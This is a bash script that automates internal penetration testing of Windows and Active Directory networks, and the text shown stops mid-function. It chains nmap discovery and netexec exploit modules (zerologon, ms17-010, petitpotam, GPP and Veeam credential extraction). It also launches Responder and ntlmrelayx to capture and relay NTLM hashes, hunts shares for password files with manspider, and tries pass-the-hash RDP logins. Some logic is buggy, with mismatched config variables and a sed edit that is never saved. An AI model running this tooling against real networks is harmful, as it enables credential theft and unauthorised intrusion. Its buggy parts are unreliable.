#!/bin/bash

#################################################################
#####  Developped by Aurélien BOURDOIS                      #####
#####  https://www.linkedin.com/in/aurelien-bourdois/       #####
#################################################################

# #++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# ###################			FUNCTION CALLS 		#########################
# #++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
starter() {
	
	#to avoid error from netexec, put a random name on $Username variable
	if [ -z "$Username" ]; then
		Username="anonymous"
	fi

	if [ -z "$Password" ] && [ -z "$NT_Hash" ]; then
		Password="anonymous"
	fi

	read -p "Proxychains ? : (yY/nN)" proxychains
	if [ "$proxychains" = "y" ] || [ "$proxychains" = "Y" ]; then
		proxychains="proxychains -q"
	else proxychains=""
	fi

	if [ -n "$Password" ]; then
		cme_creds="-p $Password"
	else
		cme_creds="-H $NT_Hash"
	fi
	
	# Paths
	DIR=$ProjectName
	logfile=$DIR/log_$Username.log
	net=$(python3 -c "print('$rangeIP'.split('/')[0])")
	DIR_PORTS="$DIR/ports"
	DIR_VULNS="$DIR/vulns"
	hostname_file=$(if [ -e "$DIR/hostname_file.txt" ]; then cat "$DIR/hostname_file.txt"; fi)

	# TimeReference
	start=$SECONDS
	
	if [ ! -d "$DIR" ];then
		mkdir $DIR
	fi
	excluded_hosts="$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)"
	RDP_TIMEOUT=7
	CME_TIMEOUT=15 #increase in case of slow network
	SNMP_TIMEOUT=5
	SPACE='   '

	################### VARIABLES ##############################
	# Colors
	LIGHTRED="\033[1;31m"
	LIGHTGREEN="\033[1;32m"
	LIGHTORANGE="\033[1;33m"
	LIGHTBLUE="\033[1;34m"
	RESET="\033[0;00m"

	## Creation des dossiers 
	if [ ! -e $DIR ];then
		mkdir $DIR
	fi
	if [ ! -e $DIR/scan_nmap ];then
		mkdir $DIR/scan_nmap
	fi
	if [ ! -e $DIR/ports ];then
		mkdir $DIR/ports
	fi
	if [ ! -e $DIR/vulns ];then
		mkdir $DIR/vulns
	fi

	if [ -e $DIR/log_$Username.log ];then
		rm $DIR/log_$Username.log
	fi
	banner
	pop_logger
	check_live_hosts
}

######################## 	LOG FUNCTIONS  ##########################
log () {
	#anciennement $(echo $1 | sed 's/\n*//g')
	echo -e "$(date +%F-%T)  $(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')" >> $logfile
	echo -e "$1"
}
red_log (){
	echo -e "$LIGHTRED$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTRED$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}
orange_log (){
	echo -e "$LIGHTORANGE$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTORANGE$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}
green_log (){
	echo -e "$LIGHTGREEN$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTGREEN$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}
blue_log (){
	echo -e "$LIGHTBLUE$1 $RESET"
	echo -e "$(date +%F-%T)  $LIGHTBLUE$(echo "$1" | sed ':a;N;$!ba;s/\n\([[:space:]]*\)/\1/g')$RESET" >> $logfile
}

################### BANNER ##############################
banner () {
	log "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐"
	log "Starting $0 on: "
	log "IP range : $rangeIP"
	log "Username : $Username"
	if [ -n "$NT_Hash" ]; then
		log "NT_Hash  : $NT_Hash"
	else
		log "Password : $Password"
	fi
	log "Excluding: $excluded_hosts"
	log "⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐"
}

######################## 	POP UP LOGGER  ##########################
pop_logger () {
	if [ $(which terminator) ];then
		#terminator --new-tab -m -e "tail -F /root/test" &
		terminator --new-tab --title "Enumeration" -m -e "tail -F $logfile" &
	else
		#export QT_QPA_PLATFORM=offscreen 
		#qterminal -e "tail -F $logfile" &
		x-terminal-emulator -e "tail -F $logfile" &
	fi
	sleep 1
}

################### Check HOSTS UP 	#########################
check_live_hosts() {
	#### CALCUL DES IP ####
	MY_IP=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)
	MY_IP_WITH_MASK=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -f1)
	# Calculer l'adresse réseau pour arp-scan
	NETWORK_LAN=$(ipcalc -n -b $MY_IP_WITH_MASK | grep -oP 'Network:\s+\K\S+')
	
	#If attack range is exactly same that our actual network card
	if [ "$rangeIP" == "$NETWORK_LAN" ]; then
		$proxychains arp-scan -I $INTERFACE -g $NETWORK_LAN -q | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v $MY_IP > $DIR/tmp_hosts.txt 2>&1
		log "list hosts :"
		log "cat $DIR/tmp_hosts.txt"
		#S'assurer que les excluded hosts ne sont pas inclu dans hosts.txt
		cat $DIR/tmp_hosts.txt | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $DIR/hosts.txt
		rm $DIR/tmp_hosts.txt
		NMAP_HOSTS="-iL $DIR/hosts.txt"
		log "${SPACE}[!] Alive targets file created : $DIR/hosts.txt"
	else
		NMAP_HOSTS="$rangeIP"
	fi
}

########################### FAST SCAN NMAP #####################################
nmap_fast () {
	NMAPPATH=$DIR/scan_nmap
	log "[🔍] Scanning NMAP - Fast version"
	#Fast NMAP TCP
	if [ -n "$proxychains" ]; then
		#Proxychains ne comprenant pas les requetes personnalisés, nous lui indiqueront de faire des requetes full (sT)
		#$proxychains nmap -sT -Pn $NMAP_HOSTS -R -oA $DIR/scan_nmap/scan_Fast_TCP --top 1000 --open --exclude $excluded_hosts >/dev/null 2>&1
		blue_log "Import 'nmap binaries' on the victim to do a nmap from the linux target (too slow through proxychains)"
		blue_log "nmap -sV -Pn -T4 --open -oA scan_Fast_TCP $rangeIP"
		blue_log "nmap -Pn -sU --open --top 25 -oA scan_Full_UDP $rangeIP"
		blue_log "Then exfiltrate nmap reports to '$DIR/scan_nmap/' on the attacker's machine"
		blue_log "Then mount the proxychains"
		log "Press Entrer when ready ..."
		read
	else
		log "${SPACE}[📂] TCP ..."
		#Si pas proxychains, sS pour TCP
		#ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); echo "nmap -p $ports -sT -sV -T4 -R $target"; nmap -p $ports -sT -sV -T4 -R $target
		nmap -Pn $NMAP_HOSTS -sS -sV -T4 -oA $DIR/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
		#log "${SPACE}[!] Nmap TCP report : ${DIR}/scan_nmap/scan_Fast_TCP.nmap"
		xsltproc $DIR/scan_nmap/scan_Fast_TCP.xml -o /tmp/scan_Fast_TCP.html
		log "${SPACE}[!] Nmap TCP report in HTML format : /tmp/scan_Fast_TCP.html"
		log "${SPACE}[📂] UDP ..."
		#UDP
		nmap -Pn -sU $NMAP_HOSTS -R -oA $DIR/scan_nmap/scan_Full_UDP --open --top 25 -T4 --exclude $excluded_hosts >/dev/null 2>&1
	fi
	
	#Compilation TCP + UDP report
	cat ${DIR}/scan_nmap/scan_Full_UDP_open.nmap $DIR/scan_nmap/scan_Fast_TCP.nmap > $DIR/scan_nmap/scan_Full_Fast.nmap 
	#log "${SPACE}[!] Nmap UDP report : ${DIR}/scan_nmap/scan_Full_UDP.nmap"
	
	#Convert to html
	cat ${DIR}/scan_nmap/scan_Full_UDP.nmap | grep -v "open|filtered" > ${DIR}/scan_nmap/scan_Full_UDP_open.nmap

	xsltproc $DIR/scan_nmap/scan_Full_UDP.xml -o /tmp/scan_Full_UDP.html
	#Suppression des filtered|opened
	awk 'BEGIN { RS="</tr>" } /open\|filtered/ { next } { printf "%s", $0 "</tr>" }' /tmp/scan_Full_UDP.html > /tmp/scan_Full_UDP_open.html
	log "${SPACE}[!] Nmap UDP report in HTML format : /tmp/scan_Full_UDP.html"
	
	#Extracting IP from the 2 reports
	grep -i 'Nmap scan report for' "${DIR}/scan_nmap/scan_Fast_TCP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${DIR}/hosts.txt
	grep -i 'Nmap scan report for' "${DIR}/scan_nmap/scan_Full_UDP.nmap" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' >> ${DIR}/hosts.txt

	sort -u ${DIR}/hosts.txt -o ${DIR}/hosts.txt

	log "${SPACE}[!] NMAP scan detected $(wc -l "$DIR/hosts.txt" | awk '{print $1}') machines"
		
	#resolution_ip=$(cat $DIR/hosts.txt)
	#for ip in $resolution_ip; do
	#	tmp_resolution=$($proxychains timeout 3 netexec smb $ip < /dev/null 2>/dev/null)
	#	echo "$tmp_resolution" | awk '{print $2 ":" $4}' >> ${DIR}/hostname_file.txt
	#done
	
	##Tri par ports :
	log "${SPACE}[!] Sorting by opened ports ..."
	fichier_nmap="$DIR/scan_nmap/scan_Full_Fast.nmap"
	log "${SPACE}[!] Name Resolution machines ... "
	
	# Parcourir le fichier Nmap
	#Initiliser le fichier ${DIR}/hostname_file.txt
	if [ -e ${DIR}/hostname_file.txt ];then
		rm ${DIR}/hostname_file.txt
		touch ${DIR}/hostname_file.txt
	fi
	
	while IFS= read -r ligne; do
		if [[ $ligne == "Nmap scan report for"* ]]; then
			# Extraire l'adresse IP
			ip=$(echo "$ligne" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
			resolve="0"
			domain_nmap=''
			host_nmap=''
		elif [[ $ligne =~ ^([0-9]+)/tcp ]] || [[ $ligne =~ ^([0-9]+)/udp ]]; then
			# Extraire le numéro de port et le nom du protocole
			port="${BASH_REMATCH[1]}"
			protocole="${BASH_REMATCH[2]}"
			# Ajouter l'IP à son fichier correspondant
			echo "$ip" >> "${DIR_PORTS}/${port}.txt"
			#Si le script est executé plusieurs fois, supprimera les doublons
			sort -u ${DIR_PORTS}/${port}.txt -o ${DIR_PORTS}/${port}.txt
		fi
	done < "$fichier_nmap"
	resolve="0"
	while IFS= read -r ligne; do
		#Extraction de la résolution DNS des machines (si elle n'est pas résolue)
		if [[ $ligne == "Nmap scan report for"* ]]; then
			resolve="0"
			ip=$(echo "$ligne" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
		fi
		if [[ "$resolve" == "0" ]]; then
			regex_Domain='Domain: ([A-Za-z0-9.-]+[^A-Za-z]*)'
			regex_Host='Service Info: Host: ([^;]+)'
			FQDN=$(echo "$ligne" | grep 'Nmap scan report for' | awk '{if ($5 ~ /[a-zA-Z]/) print $5}')
			regex_FQDN='FQDN: ([A-Za-z0-9.-]+)'
			regex_RDP_info_DNS='DNS_Computer_Name: ([A-Za-z0-9.-]+)'
			
			if [[ $ligne == "Nmap scan report for"* ]] && grep -q ${ip} "${DIR_PORTS}/445.txt"; then
				netexec smb ${ip} < /dev/null > ${DIR}/tmp_resolve.txt 2>/dev/null
				if [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+') ]] && ([[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'domain:\K[^)]+') ]] || [[ $(cat ${DIR}/tmp_resolve.txt | grep -oP 'workgroup:\K[^)]+') ]]); then
					# Extraire le nom, le domaine ou le workgroup à partir de la sortie
					name=$(cat ${DIR}/tmp_resolve.txt | grep -oP 'name:\K[^)]+')
					domain_workgroup=$(cat ${DIR}/tmp_resolve.txt | grep -oP '(domain|workgroup):\K[^)]+')
					ip_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
					#Confirm that name or domain_workgroup are not ip_address
					if [[ ! "$name" =~ $ip_regex ]]; then
						echo "${ip}:${name}.${domain_workgroup}" >> ${DIR}/hostname_file.txt
						resolve="1"
					fi
				fi
			elif [[ $ligne =~ $regex_Domain ]];then
				#Delete potential non alphabetic caracters at the end (ex: ctf.lab0.)
				domain_nmap="${BASH_REMATCH[1]}"
				cleaned_domain=$(echo "$domain_nmap" | sed 's/[^a-zA-Z]*$//')
			elif [[ $ligne =~ $regex_Host ]];then
				host_nmap="${BASH_REMATCH[1]}"
			elif [[ -n "$host_nmap" ]] && [[ -n "$cleaned_domain" ]];then
				#If $host_nmap and $cleaned_domain are found, then write them to /etc/hosts
				echo "${ip}:${host_nmap}.${cleaned_domain}" >> ${DIR}/hostname_file.txt
				resolve="1"
			elif [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]]; then
				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
				resolve="1"
			elif [[ $ligne =~ $regex_FQDN ]] || [[ $ligne =~ $regex_RDP_info_DNS ]];then
				FQDN="${BASH_REMATCH[1]}"
				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
				resolve="1"
			fi
		fi
	done < "$fichier_nmap"
	sort -u ${DIR}/hostname_file.txt -o ${DIR}/hostname_file.txt

	#log "[!] Updating DNS resolver with potential domain found ... "
	ip=$(cat ${DIR_PORTS}/636.txt ${DIR_PORTS}/389.txt | sort -u | head -n 1)
	domain=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}' | cut -d '.' -f 2-)
	
	#Backup original file
	if [ ! -f "/etc/systemd/resolved.conf.bkp" ]; then
		cp /etc/systemd/resolved.conf /etc/systemd/resolved.conf.bkp
	fi
	cp /etc/systemd/resolved.conf.bkp /etc/systemd/resolved.conf
	echo "DNS=${ip}" >> /etc/systemd/resolved.conf
	echo "Domains=${domain}" >> /etc/systemd/resolved.conf
	sudo systemctl restart systemd-resolved
}

########################## SMB NTLM RELAY ##################################
relay () {
	log "[🔍] Getting hosts with Relayable SMB"
	mkdir $DIR_VULNS/NTLM_relay
	$proxychains netexec --timeout $CME_TIMEOUT smb ${DIR}/hosts.txt --gen-relay-list $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt
	sort -u $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -o $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt
	if [ -f "$DIR_VULNS/ntlm-relay-list.txt" ];then
		nb_relay_vulnerable=$(cat $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt | wc -l)
		green_log "${SPACE}[💀] NTLM Relayable list ($nb_relay_vulnerable) for $rangeIP was logged successfully in $DIR_VULNS/ntlm-relay-list.txt"
		#If prochains isn't enabled then try to catch something with responder and ntlmrelay
		if [ -z "$proxychains" ];then
			#Turn off all settings before "Custom challenge" on responder config file
			responder_file="/usr/share/responder/Responder.conf"
			sed '/^; Custom challenge/,$!s/= Off/= On/' "$responder_file"
			#Configure proxychains port 1080 (ntlmrelayx) and dynamic_chain (to have possibility of multiples socks)
			responder_file="/etc/proxychains.conf"
			sed -i '/^strict_chain/s/^/#/' "$config_file"
			sed -i '/^random_chain/s/^/#/' "$config_file"
			sed -i '/^#.*dynamic_chain/s/^#//' "$config_file"
			grep -q "^socks.* 127.0.0.1 1080" "$config_file" || echo 'socks4  127.0.0.1 1080' >> "$config_file"
			responder -I eth0 -bd --wpad --lm --disable-ess -v; exec bash
			if [ $(which terminator) ];then
				#terminator --new-tab -m -e "tail -F /root/test" &
				terminator --new-tab --title "responder" -m -e "responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; exec bash" &
				sleep 1
				terminator --new-tab --title "RelayNTLM" -m -e "/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; exec bash" &
			else
				#export QT_QPA_PLATFORM=offscreen 
				#qterminal -e "tail -F $logfile" &
				x-terminal-emulator -e "responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; exec bash" &
				sleep 1
				x-terminal-emulator -e "/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; exec bash" &
			fi
		fi
		green_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
	else
		rm $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt
		red_log "${SPACE}[X] No NTLM relay possible for this range $rangeIP"
	fi
}

manspider () {
	#accessible_shares=$(cat )
	if [ -e "$DIR_PORTS/445.txt" ]; then
		max_size_files_checked="15M"
		threads="100"
		wordlist="confiden classified bastion '\bcode*.' creds credential wifi hash ntlm '\bidentifiant*.' compte utilisateur '\buser*.' '\b\$.*pass*.' '\root*.' '\b\$.*admin*.' '\badmin*.' account login '\bcpassword*.' '\bpassw*.' cred '\bpasse*.' '\b\$.*pass*.' 'mot de passe' cisco pfsense pfx ppk rsa pem ssh rsa '\bcard*.' '\bcarte*.' '\bidentite*.' '\bidentité*.' '\bpasseport*.'"
		exclusions="--exclude-dirnames AppData --exclude-extensions DAT LOG2 LOG1 lnk msi"
		request_manspider="manspider -n -s $max_size_files_checked -t $threads -c $wordlist $exclusions"
		log "[🔍] Launching manspider"
		log "[!]  If kerberos only : Netexec spider !"
		if [ $(which terminator) ];then
			terminator --new-tab --title "manspider" -m -e "$proxychains $request_manspider -u $Username $cme_creds $rangeIP; exec bash" &
		else
			#export QT_QPA_PLATFORM=offscreen 
			#qterminal -e "tail -F $logfile" &
			x-terminal-emulator -e "$request_manspider -u $Username $cme_creds $rangeIP; exec bash" &
		fi
	fi
}

########################### CHECK vulnerabilities ##################################

vulns () {
	log "[🔍] Starting vulnerabilty scans on all devices"
	if [[ "$Username" != "anonymous" ]];then
		smb_modules_devices=(coerce_plus ms17-010 zerologon spooler webdav install_elevated gpp_password gpp_autologin enum_av enumdns veeam msol)
	else
		smb_modules_devices=""
	fi
	smb_modules_devices_anonymous=(ms17-010 zerologon petitpotam)
	Devices=$(cat $DIR/ports/445.txt)
	
	for module in ${smb_modules_devices_anonymous[@]};do
		for ip in $Devices; do
			host=${ip}
			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
			$proxychains timeout $CME_TIMEOUT netexec smb $host -u '' -p '' -M $module < /dev/null > $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt 2>/dev/null
			#cat $DIR_VULNS/Vulns_Device_tmp_$module.txt
			if [[ "$module" == "ms17-010" || "$module" == "zerologon" || "$module" == "petitpotam"  ]] && grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt;then
				green_log "${SPACE}[💀] Vulnerabilty '$module' via anonymous login found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_anonymous_${ip}_$module.txt"
			fi
		done
	done
	
	for module in ${smb_modules_devices[@]};do
		if [[ "$module" == "coerce_plus" ]]; then
			option_vulns="-o LISTENER=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)"
		else
			option_vulns=""
		fi
		for ip in $Devices; do
			host=${ip}
			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
			$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds -M $module $option_vulns < /dev/null > $DIR_VULNS/Vulns_Device_${ip}_$module.txt 2>/dev/null
			#cat $DIR_VULNS/Vulns_Device_tmp_$module.txt
			if grep -Eqo "STATUS_NOT_SUPPORTED|Failed to authenticate the user .* with ntlm" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				if [[ -z $hostname ]];then
					kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
					host="$(echo $hostname | cut -d '.' -f 1)"
				fi
				$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds $kerberos -M $module $option_vulns < /dev/null > $DIR_VULNS/Vulns_Device_${ip}_$module.txt 2>/dev/null
			fi
			if [[ "$module" == "ms17-010" || "$module" == "zerologon" || "$module" == "petitpotam" || "$module" == "nopac" ]] && grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				green_log "${SPACE}[💀] Vulnerabilty '$module' found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif [[ "$module" == "gpp_password" || "$module" == "gpp_password" ]] && grep -Eqio "Found credentials" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				green_log "${SPACE}[💀] Vulnerabilty '$module' found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif [[ "$module" == "webdav" || "$module" == "spooler" ]] && grep -Eqio "$module" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				green_log "${SPACE}[💀] $module found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif [[ "$module" == "install_elevated" ]] && grep -Eqio "Pwn3d!" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && grep -Eqio "Enabled" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				green_log "${SPACE}[💀] install_elevated vulnérability found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif [[ "$module" == "enum_av" ]] && grep -Eqio "enum_av" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && ! grep -Eqio "Found NOTHING" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				green_log "${SPACE}[💀] AV identified on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif [[ "$module" == "enumdns" ]] && grep -Eqio "record" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				green_log "${SPACE}[💀] DNS exfiltration done on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif echo "$module" | grep -q "coerce_plus" &&  grep -Eqio "vulnerable" $DIR_VULNS/Vulns_Device_${ip}_$module.txt ;then
				green_log "${SPACE}[💀] At least 1 vulnerabilty found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif echo "$module" | grep -q "veeam" &&  grep -Eqio "Extracting stored credentials" $DIR_VULNS/Vulns_Device_${ip}_$module.txt ;then
				green_log "${SPACE}[💀] At least 1 vulnerabilty found on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			elif echo "$module" | grep -q "msol" &&  grep -Eqio "Executing the script" $DIR_VULNS/Vulns_Device_${ip}_$module.txt && ! grep -Eqio "Could not retrieve output file" $DIR_VULNS/Vulns_Device_${ip}_$module.txt;then
				green_log "${SPACE}[💀] MSOL credentials could be find on $ip ($hostname) ! -> $DIR_VULNS/Vulns_Device_${ip}_$module.txt"
			fi				
			
			
		done
	done
}

###################### FTP  ##########################
ftp () {
	if [ -e "$DIR_PORTS/21.txt" ]; then
		# Lire le fichier 21.txt ligne par ligne
		log "[🔍] Check FTP"
		
		FTP=$(cat $DIR_PORTS/21.txt)
		for ip in $FTP; do
			# Essayer de se connecter à l'adresse IP via FTP
			$proxychains netexec ftp ${ip} -u "anonymous" -p "" < /dev/null >> $DIR_VULNS/ftp_anonymous_${ip}.txt 2>/dev/null 
		
			# Vérifier le code de retour de la commande SSH
			if grep -aq '\[+\]' $DIR_VULNS/ftp_anonymous_${ip}.txt; then
				green_log "${SPACE}[💀] FTP ANONYMOUS connection successed on $ip"
				blue_log "${SPACE} [+] ftp anonymous@$ip"
			fi
			
			if [[ "$Username" != "anonymous" ]];then
				$proxychains netexec ftp ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ftp_${Username}_${ip}.txt 2>/dev/null 
				# Vérifier le code de retour de la commande SSH
				if grep -aq '\[+\]' $DIR_VULNS/ftp_${Username}_${ip}.txt; then
					green_log "${SPACE}[💀] FTP connection successed on $ip with ${username} user"
					blue_log "${SPACE} [+] ftp $Username@$ip"
				fi
			fi
		done
	fi	

}

###################### SSH  ##########################
ssh () {
	if [ -e "$DIR_PORTS/22.txt" ] && [ -n "$Username" ] && [ "$Username" != "anonymous" ] && [ -n "$Password" ]; then
		# Lire le fichier 22.txt ligne par ligne
		log "[🔍] Check SSH"
		SSH=$(cat $DIR_PORTS/22.txt)
		for ip in $SSH; do
			# Essayer de se connecter à l'adresse IP via SSH
			#$proxychains sshpass -p "$Password" ssh -o StrictHostKeyChecking=no ${Username}@${ip} "ls" 2>/dev/null
			
			$proxychains netexec ssh ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ssh_${Username}_${ip}.txt 2>/dev/null 
			# Vérifier le code de retour de la commande SSH
			if grep -aq '\[+\]' $DIR_VULNS/ssh_${Username}_${ip}.txt; then
				green_log "${SPACE}[💀] SSH connection successed on $ip with ${username} user"
				blue_log "ssh $Username@$ip"
			fi
		done
	fi
}

######## WINRM #######
winrm () {
	# Vérifie si les fichier winrm existe
	if { [ -e "$DIR_PORTS/5985.txt" ] || [ -e "$DIR_PORTS/5986.txt" ] || [ -e "$DIR_PORTS/47001.txt" ]; } && [ "$Username" != "anonymous" ]; then
		log "[🔍] Check WINRM"
		for fichier in $DIR_PORTS/5985.txt $DIR_PORTS/5986.txt $DIR_PORTS/47001.txt; do
			cat "$fichier" /dev/null 2>&1 >> "$DIR_PORTS/winrm.txt" || echo "Le fichier $fichier est absent."
		done
		sort -u ${DIR_PORTS}/winrm.txt -o ${DIR_PORTS}/winrm.txt
		WINRM=$(cat $DIR_PORTS/winrm.txt)
		for ip in $WINRM; do
			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
			
			# Essayer de se connecter à l'adresse IP via WINRM
			$proxychains netexec --timeout $CME_TIMEOUT winrm ${ip} -u "$Username" $cme_creds < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
			if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/winrm_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/winrm_${ip}"; then
				#Si NTLM n'est pas supporté, recommencer en passant avec kerberos
				kerberos="--kerberos"
				host="${hostname}"
				rm ${DIR_VULNS}/winrm_${ip}
				$proxychains netexec --timeout $CME_TIMEOUT winrm $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
			fi
			
			# Vérifier le code de retour de la commande WINRM
			if [ "$(cat ${DIR_VULNS}/winrm_${ip} | grep -ai '\[+\]')" ]; then
				green_log "${SPACE}[💀] WINRM connection successed on $ip ($hostname)"
				blue_log "$proxychains evil-winrm -i ${host} -u "$Username" $cme_creds"
			else
				#echo ${DIR_VULNS}/winrm_${ip}
				#cat ${DIR_VULNS}/winrm_${ip}
				rm ${DIR_VULNS}/winrm_${ip}
			fi
		done
	fi
}

rdp () {	
	######## RDP #######
	# Vérifie si le fichier 22.txt existe
	if [[ -e "$DIR_PORTS/3389.txt" ]] && [[ "$Username" != "anonymous" ]]; then
		#### Avoid error variable $DISPLAY from xfreerdp
		#apt install xvfb
		#Xvfb :99 & export DISPLAY=:99
		
		# Lire le fichier 22.txt ligne par ligne
		log "[🔍] Checking RDP"
		RDP=$(cat $DIR_PORTS/3389.txt)
		for ip in $RDP; do
			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
			#Suppression de l'historique des certificats
			rm ~/.config/freerdp -rf
			#Try to connect with NTLM
			if [ -n "$NT_Hash" ]; then
				script -c "$proxychains timeout $RDP_TIMEOUT xfreerdp /cert-tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard" ${DIR_VULNS}/rdp_${ip} > /dev/null 2>&1 < /dev/null
				RDP_command="$proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard"
			else
				script -c "$proxychains timeout $RDP_TIMEOUT xfreerdp /cert-tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard" ${DIR_VULNS}/rdp_${ip} > /dev/null 2>&1 < /dev/null
				RDP_command="$proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard"
			fi
			# Vérifier le code de retour de la commande RDP
			if [ "$(cat ${DIR_VULNS}/rdp_${ip} | grep -i "Loading Dynamic Virtual")" ] || [ "$(cat ${DIR_VULNS}/rdp_${ip} | grep -i "Loaded fake backend")" ]; then
			#Faire un cat -v -e FILE pour voir les couleurs et debut - fin de lignes
				green_log "${SPACE}[💀] RDP connection successed on $ip ($hostname) -> Can be only available in restricted admin mode or with password"
				blue_log "${SPACE} [+] $RDP_command"
			elif cat ${DIR_VULNS}/rdp_${ip} | grep -aqi "SEC_E_UNSUPPORTED_FUNCTION";then #If NTLM is disable
				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
				#Si NTLM n'est pas supporté, recommencer en passant avec kerberos
				if [[ -n "$hostname" ]];then
					kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
					host="$(echo $hostname | cut -d '.' -f 1)"
				fi
				#Convert to NTLM hash to avoid to disconnect user if he is already connected. Found this tricks on my lab
				if [[ -n "$Password" ]];then
					NTLM=$(iconv -f ASCII -t UTF-16LE <(printf "${Password}") | openssl dgst -md4 | awk -F "= " '{print $2}')
					#First try with NTLM_Hash
					$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" -H "$NTLM" $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
